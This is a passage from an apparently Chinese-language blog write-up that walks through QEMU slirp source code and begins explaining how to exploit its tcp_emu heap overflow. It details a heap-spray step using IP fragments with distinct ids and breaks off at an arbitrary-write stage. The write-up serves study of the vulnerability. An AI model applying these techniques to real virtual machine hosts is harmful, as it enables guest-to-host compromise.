original SYN packet,</span></span><br><span class="line"><span class="comment">				    * for non-blocking connect()'s, and</span></span><br><span class="line"><span class="comment">				    * PING reply's */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcpiphdr</span> *<span class="title">so_ti</span>;</span>	   <span class="comment">/* Pointer to the original ti within</span></span><br><span class="line"><span class="comment">				    * so_mconn, for non-blocking connections */</span></span><br><span class="line">  <span class="keyword">uint32_t</span>      so_urgc;</span><br><span class="line">  <span class="keyword">union</span> slirp_sockaddr fhost;      <span class="comment">/* Foreign host */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_faddr fhost.sin.sin_addr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_fport fhost.sin.sin_port</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_faddr6 fhost.sin6.sin6_addr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_fport6 fhost.sin6.sin6_port</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_ffamily fhost.ss.ss_family</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">union</span> slirp_sockaddr lhost;      <span class="comment">/* Local host */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_laddr lhost.sin.sin_addr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_lport lhost.sin.sin_port</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_laddr6 lhost.sin6.sin6_addr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_lport6 lhost.sin6.sin6_port</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> so_lfamily lhost.ss.ss_family</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span>	so_iptos;	<span class="comment">/* Type of service */</span></span><br><span class="line">  <span class="keyword">uint8_t</span>	so_emu;		<span class="comment">/* Is the socket emulated? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span>       so_type;        <span class="comment">/* Type of socket, UDP or TCP */</span></span><br><span class="line">  <span class="keyword">int32_t</span>       so_state;       <span class="comment">/* internal state flags SS_*, below */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> 	<span class="title">tcpcb</span> *<span class="title">so_tcpcb</span>;</span>	<span class="comment">/* pointer to TCP protocol control block */</span></span><br><span class="line">  u_int	so_expire;		<span class="comment">/* When the socket will expire */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span>	so_queued;		<span class="comment">/* Number of packets queued from this socket */</span></span><br><span class="line">  <span class="keyword">int</span>	so_nqueued;		<span class="comment">/* Number of packets queued in a row</span></span><br><span class="line"><span class="comment">				 * Used to determine when to "downgrade" a session</span></span><br><span class="line"><span class="comment">					 * from fastq to batchq */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> <span class="title">so_rcv</span>;</span>		<span class="comment">/* Receive buffer */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> <span class="title">so_snd</span>;</span>		<span class="comment">/* Send buffer */</span></span><br><span class="line">  <span class="keyword">void</span> * extra;			<span class="comment">/* Extra pointer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>/slirp/sbuf.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> &#123;</span> <span class="comment">//用于保存TCP层数据</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sb_cc;		<span class="comment">/* actual chars in buffer */</span>       <span class="comment">//缓冲区中实际写入的字符数量</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sb_datalen;	<span class="comment">/* Length of data  */</span>          <span class="comment">//缓冲区总大小</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_wptr;	<span class="comment">/* write pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * bytes should be written in the sbuf */</span> <span class="comment">//写指针</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_rptr;	<span class="comment">/* read pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * byte should be read from the sbuf */</span>   <span class="comment">//读指针</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_data;	<span class="comment">/* Actual data */</span>                  <span class="comment">//缓冲区的起始地址</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc)</span></span><br></pre></td></tr></table></figure>
<p><code>/slirp/mbuf.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span> <span class="comment">//用于保存IP层数据</span></span><br><span class="line">	<span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">	<span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_next</span>;</span>		<span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span>	<span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span>	<span class="comment">/* Flags aren't used in the output queue */</span></span><br><span class="line">	<span class="keyword">int</span>	m_flags;		<span class="comment">/* Misc flags */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>	m_size;			<span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span>	<span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">caddr_t</span>	m_data;			<span class="comment">/* Current location of data */</span></span><br><span class="line">	<span class="keyword">int</span>	m_len;			<span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line"></span><br><span class="line">	Slirp *slirp;</span><br><span class="line">	<span class="keyword">bool</span>	resolution_requested;</span><br><span class="line">	<span class="keyword">uint64_t</span> expiration_date;</span><br><span class="line">	<span class="keyword">char</span>   *m_ext;</span><br><span class="line">	<span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">	<span class="keyword">char</span>    m_dat[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>漏洞点位于<code>tcp_emu.c:638</code>，其实也不能说是位于，这个漏洞需要多方搭配才能触发：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">tcp_emu(struct socket *so, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	Slirp *slirp = so-&gt;slirp;</span><br><span class="line">	u_int n1, n2, n3, n4, n5, n6;</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">257</span>];</span><br><span class="line">	<span class="keyword">uint32_t</span> laddr;</span><br><span class="line">	u_int lport;</span><br><span class="line">	<span class="keyword">char</span> *bptr;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">switch</span>(so-&gt;so_emu) &#123;</span><br><span class="line">		<span class="keyword">int</span> x, i;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">			<span class="keyword">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> = &amp;<span class="title">so</span>-&gt;<span class="title">so_rcv</span>;</span></span><br><span class="line">			<span class="comment">//m是mbuf类型,存储用户从IP层传入的数据的结构体,so_rcv是sbuf类型,存储TCP层中数据的结构体</span></span><br><span class="line">			<span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">			so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">			so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br><span class="line">			m-&gt;m_data[m-&gt;m_len] = <span class="number">0</span>; <span class="comment">/* NULL terminate */</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'\r'</span>) || <span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'\n'</span>)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">sscanf</span>(so_rcv-&gt;sb_data, <span class="string">"%u%*[ ,]%u"</span>, &amp;n1, &amp;n2) == <span class="number">2</span>) &#123;</span><br><span class="line">					HTONS(n1);</span><br><span class="line">					HTONS(n2);</span><br><span class="line">					<span class="comment">/* n2 is the one on our host */</span></span><br><span class="line">					<span class="keyword">for</span> (tmpso = slirp-&gt;tcb.so_next;</span><br><span class="line">					     tmpso != &amp;slirp-&gt;tcb;</span><br><span class="line">					     tmpso = tmpso-&gt;so_next) &#123;</span><br><span class="line">						<span class="keyword">if</span> (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_lport == n2 &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_fport == n1) &#123;</span><br><span class="line">							<span class="keyword">if</span> (getsockname(tmpso-&gt;s,</span><br><span class="line">								(struct sockaddr *)&amp;addr, &amp;addrlen) == <span class="number">0</span>)</span><br><span class="line">							   n2 = ntohs(addr.sin_port);</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">                                so_rcv-&gt;sb_cc = <span class="built_in">snprintf</span>(so_rcv-&gt;sb_data,</span><br><span class="line">                                                         so_rcv-&gt;sb_datalen,</span><br><span class="line">                                                         <span class="string">"%d,%d\r\n"</span>, n1, n2);</span><br><span class="line">				so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;</span><br><span class="line">				so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;</span><br><span class="line">			&#125;</span><br><span class="line">			m_free(m);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">     <span class="keyword">case</span> EMU_FTP: <span class="comment">/* ftp */</span></span><br><span class="line">            ....</span><br><span class="line">     <span class="keyword">case</span> EMU_KSH:</span><br><span class="line">            ...</span><br><span class="line">     <span class="keyword">case</span> EMU_IRC:</span><br><span class="line">            ...</span><br><span class="line">     <span class="keyword">case</span> EMU_REALAUDIO:</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在跑<code>exp</code>之前，需要先用这个命令将网卡<code>enp0s3</code>的<code>mtu</code>变大：<code>ifconfig enp0s3 mtu 9000 up</code></p>
<p>漏洞利用比较复杂，主要分四个阶段：</p>
<h3 id="Malloc-Primitive"><a href="#Malloc-Primitive" class="headerlink" title="Malloc Primitive"></a>Malloc Primitive</h3><p>由于溢出发生处是在一块堆上的纯<code>buffer</code>，前后的数据在实际运行中都是不稳定的，所以首先需要一个适当的手段来控制堆。这一步是及其重要的，我个人感觉这一步也是实际漏洞中的利用手法和<code>CTF</code>最大的差别，<code>CTF</code>就是比较稳定，然后堆的状态是完全可控的，所以直接去想怎么利用就行了，而实际漏洞的堆因为多方面原因导致其是非常混乱的。。。所以使堆变得稳定是非常非常重要的一步。。。</p>
<p>具体原理为：</p>
<p>在<code>ip_input</code>函数中的以下部分代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">...	</span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123; <span class="comment">//ip-&gt;ip_off不包含IP_DF(Don't Fragment)标志位才能触发ip_reass</span></span><br><span class="line">	  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Look for queue of fragments</span></span><br><span class="line"><span class="comment">		 * of this datagram.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">		     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, struct ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp; <span class="comment">//发送大量id不同的数据包,使if条件无法满足,进而找不到之前的数据包,导致fp为NULL</span></span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">		    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">	found:</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Adjust ip_len to not reflect header,</span></span><br><span class="line"><span class="comment">		 * set ip_mff if more fragments are expected,</span></span><br><span class="line"><span class="comment">		 * convert offset of this to bytes.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF) <span class="comment">//含有IP_MF(More Fragment)标志位时,ip_tos带有1,不含有时ip_tos不带有1</span></span><br><span class="line">		  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">		 * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">		 * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">			ip = ip_reass(slirp, ip, fp);<span class="comment">//我们的目的是使fp=NULL的时候,进入ip_reass函数</span></span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			m = dtom(slirp, ip);</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">if</span> (fp)</span><br><span class="line">		   	   ip_freef(slirp, fp);</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在<code>ip_reass</code>中，<code>fp == NULL</code>时会进入这段代码，会调用<code>m_get</code>申请一个新的<code>mbuf</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ip_input.c:254       </span></span><br><span class="line"><span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">m_get</span>(<span class="title">slirp</span>);</span> <span class="comment">//利用这里触发堆喷</span></span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (t == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	      <span class="keyword">goto</span> dropfrag;</span><br><span class="line">	  &#125;</span><br><span class="line">	  fp = mtod(t, struct ipq *);</span><br><span class="line">	  insque(&amp;fp-&gt;ip_link, &amp;slirp-&gt;ipq.ip_link);</span><br><span class="line">	  fp-&gt;ipq_ttl = IPFRAGTTL;</span><br><span class="line">	  fp-&gt;ipq_p = ip-&gt;ip_p;</span><br><span class="line">	  fp-&gt;ipq_id = ip-&gt;ip_id;</span><br><span class="line">	  fp-&gt;frag_link.next = fp-&gt;frag_link.prev = &amp;fp-&gt;frag_link;</span><br><span class="line">	  fp-&gt;ipq_src = ip-&gt;ip_src;</span><br><span class="line">	  fp-&gt;ipq_dst = ip-&gt;ip_dst;</span><br><span class="line">	  q = (struct ipasfrag *)fp;</span><br><span class="line">	  <span class="keyword">goto</span> insert;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>m_get</code>里会申请内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *</span></span><br><span class="line"><span class="class"><span class="title">m_get</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="keyword">int</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">"m_get"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;</span><br><span class="line">                m = g_malloc(SLIRP_MSIZE); <span class="comment">// &lt; ------ here !!!</span></span><br><span class="line">		slirp-&gt;mbuf_alloced++;</span><br><span class="line">		<span class="keyword">if</span> (slirp-&gt;mbuf_alloced &gt; MBUF_THRESH)</span><br><span class="line">			flags = M_DOFREE;</span><br><span class="line">		m-&gt;slirp = slirp;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		m = (struct mbuf *) slirp-&gt;m_freelist.qh_link;</span><br><span class="line">		remque(m);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>m_get</code>函数里申请内存的地方，申请的内存<code>size</code>固定为<code>0x668</code>，也就是<code>mbuf</code>的<code>size</code>：</p>
<p><img src="https://i.loli.net/2021/02/26/BiVuA439Z2PdgDI.png" alt="image.png"></p>
<p>但是到这还没完，需要理解函数栈返回时的流程，在<code>ip_reass</code>中，上面那部分代码会直接<code>goto insert</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">insert:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Stick new segment in its place;</span></span><br><span class="line"><span class="comment">	 * check for complete reassembly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ip_enq(iptofrag(ip), q-&gt;ipf_prev);</span><br><span class="line">	next = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (q = fp-&gt;frag_link.next; q != (struct ipasfrag*)&amp;fp-&gt;frag_link;</span><br><span class="line">            q = q-&gt;ipf_next) &#123;</span><br><span class="line">		<span class="keyword">if</span> (q-&gt;ipf_off != next)</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		next += q-&gt;ipf_len;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (((struct ipasfrag *)(q-&gt;ipf_prev))-&gt;ipf_tos &amp; <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;                        <span class="comment">//若后续还有IP分片(IP_MF位为1),则直接返回NULL</span></span><br></pre></td></tr></table></figure>
<p>然后看<code>ip_input</code>函数里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">		ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                       <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span>; <span class="comment">//这里会直接返回,所以不会有干扰的情况发生</span></span><br><span class="line">		m = dtom(slirp, ip);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="keyword">if</span> (fp)</span><br><span class="line">	   	   ip_freef(slirp, fp);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">	ip-&gt;ip_len -= hlen;</span><br></pre></td></tr></table></figure>
<p>所以我们需要构造许多<code>ip_header</code>含有<code>IP_MF</code>不含有<code>IP_DF</code>的，且<code>id</code>字段全都不同的数据包来触发大量的<code>malloc</code>原语使堆变得可控。</p>
<p>PS：并不是所有<code>size</code>的<code>chunk</code>大量喷射都会使堆变得稳定，只是这个情况比较巧合，正好之后我们要溢出的结构体<code>chunk</code>的<code>size</code>全都大于等于<code>0x668</code>，所以其才可以起到清理作用。</p>
<p>构造的数据包在<code>gdb</code>中如下，随便截的某一个包：</p>
<p><a href="https://imgtu.com/i/yz70uq" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/26/yz70uq.png" alt="yz70uq.png"></a></p>
<p><img src="https://s3.ax1x.com/2021/02/26/yz7yUU.png" alt="yz7yUU.png"></p>
<h3 id="Arbitary-write"><a href="#Arbitary-write" class="headerlink" title="Arbitary write"></a>Arbitary write</h3><p><strong>首先需要知道的是，这一步能否成功取决于上一步的堆是否可以成功清理，以下分析皆为基于堆稳定后的利用。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 